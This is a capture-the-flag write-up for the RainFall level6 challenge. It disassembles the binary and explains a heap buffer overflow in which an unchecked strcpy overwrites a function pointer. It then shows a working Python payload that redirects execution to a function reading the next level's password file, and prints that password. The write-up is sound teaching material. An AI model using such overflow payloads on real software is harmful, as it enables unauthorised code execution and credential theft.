# level6 - Heap Buffer Overflow

On `level6`'s HOME, we find a binary named : `level6`

```shell
...
0x08048454  n
0x08048468  m
0x0804847c  main
...
```

We find three interesting functions in this binary : `main()`, `n()`, `o()`.
let's disassemble these functions:

```shell
(gdb) disass main
Dump of assembler code for function main:
   0x0804847c <+0>:	push   ebp
   0x0804847d <+1>:	mov    ebp,esp
   0x0804847f <+3>:	and    esp,0xfffffff0
   0x08048482 <+6>:	sub    esp,0x20
   0x08048485 <+9>:	mov    DWORD PTR [esp],0x40
   0x0804848c <+16>:	call   0x8048350 <malloc@plt>
   0x08048491 <+21>:	mov    DWORD PTR [esp+0x1c],eax
   0x08048495 <+25>:	mov    DWORD PTR [esp],0x4
   0x0804849c <+32>:	call   0x8048350 <malloc@plt>
   0x080484a1 <+37>:	mov    DWORD PTR [esp+0x18],eax
   0x080484a5 <+41>:	mov    edx,0x8048468
   0x080484aa <+46>:	mov    eax,DWORD PTR [esp+0x18]
   0x080484ae <+50>:	mov    DWORD PTR [eax],edx
   0x080484b0 <+52>:	mov    eax,DWORD PTR [ebp+0xc]
   0x080484b3 <+55>:	add    eax,0x4
   0x080484b6 <+58>:	mov    eax,DWORD PTR [eax]
   0x080484b8 <+60>:	mov    edx,eax
   0x080484ba <+62>:	mov    eax,DWORD PTR [esp+0x1c]
   0x080484be <+66>:	mov    DWORD PTR [esp+0x4],edx
   0x080484c2 <+70>:	mov    DWORD PTR [esp],eax
   0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>
   0x080484ca <+78>:	mov    eax,DWORD PTR [esp+0x18]
   0x080484ce <+82>:	mov    eax,DWORD PTR [eax]
   0x080484d0 <+84>:	call   eax
   0x080484d2 <+86>:	leave
   0x080484d3 <+87>:	ret
End of assembler dump.
Dump of assembler code for function m:
   0x08048468 <+0>:	push   ebp
   0x08048469 <+1>:	mov    ebp,esp
   0x0804846b <+3>:	sub    esp,0x18
   0x0804846e <+6>:	mov    DWORD PTR [esp],0x80485d1
   0x08048475 <+13>:	call   0x8048360 <puts@plt>
   0x0804847a <+18>:	leave
   0x0804847b <+19>:	ret
End of assembler dump.
(gdb) disass n
Dump of assembler code for function n:
   0x08048454 <+0>:	push   ebp
   0x08048455 <+1>:	mov    ebp,esp
   0x08048457 <+3>:	sub    esp,0x18
   0x0804845a <+6>:	mov    DWORD PTR [esp],0x80485b0
   0x08048461 <+13>:	call   0x8048370 <system@plt>
   0x08048466 <+18>:	leave
   0x08048467 <+19>:	ret
End of assembler dump.
```


We can see that to exploit this binary, we must find a way to jump to the
function `n()` which read the `.pass` file of next level.

```shell
(gdb) x/s 0x80485b0
0x80485b0:	 "/bin/cat /home/user/level7/.pass"
```

<br>

To do this, let's understand in more depth what is happening in the `main()` function.

The first information we have is in this snippet:

```shell
   0x08048482 <+6>:	sub    esp,0x20
   0x08048485 <+9>:	mov    DWORD PTR [esp],0x40
   0x0804848c <+16>:	call   0x8048350 <malloc@plt>
   0x08048491 <+21>:	mov    DWORD PTR [esp+0x1c],eax
   0x08048495 <+25>:	mov    DWORD PTR [esp],0x4
   0x0804849c <+32>:	call   0x8048350 <malloc@plt>
   0x080484a1 <+37>:	mov    DWORD PTR [esp+0x18],eax
```

So, two memory space are allocate in the heap. One of **64** bytes (`esp+0x1c`)
and an other of **4** bytes (`esp+0x18`).

The second is concatenated to the first in the assembly code :

```shell
   0x080484a5 <+41>:	mov    edx,0x8048468
   0x080484aa <+46>:	mov    eax,DWORD PTR [esp+0x18]
   0x080484ae <+50>:	mov    DWORD PTR [eax],edx
```

This lead to give the address of `m()` function to the pointer allocated by
`malloc()` (`esp+0x18` -> **4 bytes**).

The third just after:
```shell
   0x080484b0 <+52>:	mov    eax,DWORD PTR [ebp+0xc]
   0x080484b3 <+55>:	add    eax,0x4
   0x080484b6 <+58>:	mov    eax,DWORD PTR [eax]
   0x080484b8 <+60>:	mov    edx,eax
   0x080484ba <+62>:	mov    eax,DWORD PTR [esp+0x1c]
   0x080484be <+66>:	mov    DWORD PTR [esp+0x4],edx
   0x080484c2 <+70>:	mov    DWORD PTR [esp],eax
   0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>
```

We understand that the first argument given to the program is given to `strcpy()`
as *source* argument, without any verification, and the fist memory space
allocated by `malloc()` (`esp+0x1c` -> **64 bytes**) as *destination* argument. 

And Finally, this snippet get us the context to exploit:

```shell
   0x080484ca <+78>:	mov    eax,DWORD PTR [esp+0x18]
   0x080484ce <+82>:	mov    eax,DWORD PTR [eax]
   0x080484d0 <+84>:	call   eax
```

Simply, the address stores behind the second memory space allocated by `malloc()`
(`esp+0x18` -> **4 bytes**), which is the `m()` function address, is called.

It's a **Heap Buffer Overflow**.


<br>

So, to exploit this binary, we have to rewrite the address stored in the second
allocated memoty space. Lets's find the write offset we need:

```shell
(gdb) x/x $esp+0x1c
0xbffff71c:	0x08
(gdb) x/x *0xbffff71c
0x804a008:	0x00            => First allocation at 0x804a008
(gdb) x/x $esp+0x18
0xbffff718:	0x50
(gdb) x/x *0xbffff718
0x804a050:	0x00            => Second allocation at 0x804a050
```

So, we have an offset of **72 bytes** (*0x804a050 â€“ 0x804a008 = 0x48*) before
rewrite the pointer inside the second allocation. The target address is that of
the `n()` function: **0x08048454**


<br>

We can now exploit this BOF :

```shell
./level6 $(python -c 'print "A" * 72 + "\x08\x04\x84\x54"[::-1]')
```

```shell
level6@RainFall:~$ ./level6 $(python -c 'print "A" * 72 + "\x08\x04\x84\x54"[::-1]')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
